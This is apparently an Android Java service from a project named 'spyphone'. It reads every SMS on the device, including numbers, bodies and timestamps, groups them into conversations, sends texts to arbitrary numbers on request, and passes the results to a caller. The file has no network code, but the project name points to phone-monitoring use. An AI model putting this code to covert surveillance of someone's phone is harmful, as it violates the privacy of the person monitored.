package emit.esy.es.spyphone.services;

import android.app.IntentService;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Message;
import android.os.Messenger;
import android.os.RemoteException;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import emit.esy.es.spyphone.interfaces.ServiceResponse;
import emit.esy.es.spyphone.model.Sms;
import emit.esy.es.spyphone.model.SmsConversation;

/**
 * Created by Emil Makovac on 11/05/2015.
 */
public class SmsService extends IntentService implements ServiceResponse{

    private static final String LOG_TAG = "SmsService";
    ArrayList<Sms> lstSms;
    private List<String> conversationNumbers;
    String action, sendStatus;

    /**
     * Creates an IntentService.  Invoked by your subclass's constructor.
     *
     * @param name Used to name the worker thread, important only for debugging.
     */
    public SmsService(String name) {
        super(name);
    }

    public SmsService() {
        super(LOG_TAG);
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        action = intent.getStringExtra("action");
        if(action.equals("sms"))
            getAllSmsConversation(intent);
        if(action.equals("sendSms"))
            sendSms(intent);

    }

    private void sendSms(Intent intent) {
        String phoneNumber = intent.getStringExtra("phoneNum");
        String smsBody = intent.getStringExtra("smsBody");
        SmsManager smsManager = SmsManager.getDefault();
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            int simState = tm.getSimState();
            if (simState != tm.SIM_STATE_ABSENT && simState != tm.SIM_STATE_UNKNOWN){
                smsManager.sendTextMessage(phoneNumber, null, smsBody, null, null);
                sendStatus = "sent";
            } else {
                sendStatus = "fail";
            }
            onWorkDone(intent);
        } catch (Exception e){
            sendStatus = "fail";
            Log.e(LOG_TAG, e.toString());
            onWorkDone(intent);
        }
    }

    private void getAllSmsConversation(Intent intent) {
        lstSms = new ArrayList<>();
        Sms objSms = new Sms();
        conversationNumbers = new ArrayList();
        Uri message = Uri.parse("content://sms/");
        ContentResolver cr = getContentResolver();

        Cursor c = cr.query(message, null, null, null, null);

        int totalSMS = c.getCount();

        if (c.moveToFirst()) {
            for (int i = 0; i < totalSMS; i++) {

                objSms = new Sms();
                objSms.setId(c.getString(c.getColumnIndexOrThrow("_id")));
                objSms.setAddress(c.getString(c
                        .getColumnIndexOrThrow("address")));
                objSms.setMsg(c.getString(c.getColumnIndexOrThrow("body")));
                objSms.setReadState(c.getString(c.getColumnIndex("read")));

                long lngcallDate = c.getLong(c.getColumnIndexOrThrow("date"));
                SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yy HH:mm:ss");
                String strDate = sdf.format(new Date(lngcallDate));
                objSms.setTime(strDate);

                if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
                    objSms.setFolderName("received");
                } else {
                    objSms.setFolderName("sent");
                }

                lstSms.add(objSms);
                if(!conversationNumbers.contains(objSms.getAddress()))
                    conversationNumbers.add(objSms.getAddress());

                c.moveToNext();
            }
        }
        c.close();
        conversationList = createConversations();
        onWorkDone(intent);
    }

    ArrayList<SmsConversation> conversationList;
    SmsConversation smsConversation;

    private ArrayList<SmsConversation> createConversations() {
        ArrayList<SmsConversation> conversationList = new ArrayList<>();
        for(int i = 0; i< conversationNumbers.size(); i++){
            smsConversation = new SmsConversation(conversationNumbers.get(i));
            for(int j=0; j < lstSms.size(); j++){
                if(conversationNumbers.get(i).equals(lstSms.get(j).getAddress())){
                    smsConversation.add(lstSms.get(j));
                }
            }
            conversationList.add(smsConversation);
        }
        return conversationList;
    }

    @Override
    public void onWorkDone(Intent intent) {
        Log.d(LOG_TAG, "onWorkDone");
        Bundle bundle = intent.getExtras();
        Bundle data = new Bundle();
        data.putString("action", action);
        if(action.equals("sms")) {
            data.putSerializable("content", conversationList);
        } else {
            data.putString("content", sendStatus);
        }
        if (bundle != null) {
            Messenger messenger = (Messenger) bundle.get("messenger");
            Message msg = Message.obtain();
            msg.setData(data);
            try {
                messenger.send(msg);
            } catch (RemoteException e) {
                Log.i("error", "error");
            }
        }

    }
}
